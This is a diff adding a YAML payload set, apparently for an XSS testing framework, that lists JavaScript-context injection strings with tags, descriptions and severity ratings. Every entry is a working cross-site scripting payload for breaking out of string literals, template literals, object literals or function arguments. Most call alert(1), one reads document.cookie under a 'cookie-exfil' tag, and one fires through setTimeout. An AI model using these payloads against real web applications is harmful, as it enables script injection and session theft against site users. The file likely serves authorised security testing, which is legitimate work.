@@ -1,0 +1,94 @@
+# XSS Framework — JavaScript Context Payload Set
+# Payloads that exploit injection points inside existing JavaScript code blocks,
+# string literals, template literals, object literals, and function arguments.
+category: js_context
+payloads:
+  - text: "';alert(1)//"
+    tags: [js-context, js-string-break, single-quoted-string]
+    description: Break out of single-quoted JS string, call alert, comment remainder
+    severity: high
+
+  - text: "\";alert(1)//"
+    tags: [js-context, js-string-break, double-quoted-string]
+    description: Break out of double-quoted JS string
+    severity: high
+
+  - text: "\\';alert(1)//"
+    tags: [js-context, js-string-break, backslash-escape]
+    description: Escaped single quote attempt then break — for escaped-quote contexts
+    severity: high
+
+  - text: "\\\"alert(1)//"
+    tags: [js-context, js-string-break, backslash-escape]
+    description: Escaped double quote attempt then break
+    severity: high
+
+  - text: '${alert(1)}'
+    tags: [js-context, template-literal]
+    description: Template literal expression injection
+    severity: high
+
+  - text: '`${alert(1)}`'
+    tags: [js-context, template-literal, backtick]
+    description: Complete template literal with injected expression
+    severity: high
+
+  - text: '-alert(1)-'
+    tags: [js-context, expression, arithmetic]
+    description: Arithmetic expression context injection (minus operator)
+    severity: high
+
+  - text: '+alert(1)+'
+    tags: [js-context, expression, arithmetic]
+    description: Arithmetic expression context injection (plus operator)
+    severity: high
+
+  - text: "};alert(1)//"
+    tags: [js-context, object-break, block-break]
+    description: Break out of JS object literal or block, then alert
+    severity: high
+
+  - text: "');alert(1)//"
+    tags: [js-context, function-call-break]
+    description: Close function call arguments, then inject
+    severity: high
+
+  - text: "0;alert(1)//"
+    tags: [js-context, numeric-context]
+    description: Numeric context — complete value then inject statement
+    severity: medium
+
+  - text: "/**/;alert(1)//"
+    tags: [js-context, comment-inject]
+    description: Comment injection then new statement
+    severity: medium
+
+  - text: '\nalert(1)\n'
+    tags: [js-context, newline-inject]
+    description: Newline injection to create separate statement
+    severity: medium
+
+  - text: "';alert(document.cookie)//"
+    tags: [js-context, js-string-break, cookie-exfil]
+    description: Break out of JS single-quoted string, exfiltrate cookies
+    severity: high
+
+  - text: "';setTimeout('alert(1)',0)//"
+    tags: [js-context, js-string-break, setTimeout]
+    description: Break and call via setTimeout
+    severity: medium
+
+  - text: "';window['alert'](1)//"
+    tags: [js-context, js-string-break, bracket-notation]
+    description: Break out and use bracket notation for alert
+    severity: high
+
+  - text: "'-alert(1)-'"
+    tags: [js-context, string-concatenation]
+    description: Inject between concatenated strings using minus
+    severity: medium
+
+  - text: '${alert`1`}'
+    tags: [js-context, template-literal, tagged-template]
+    description: Template literal with tagged template call (no parens)
+    severity: medium
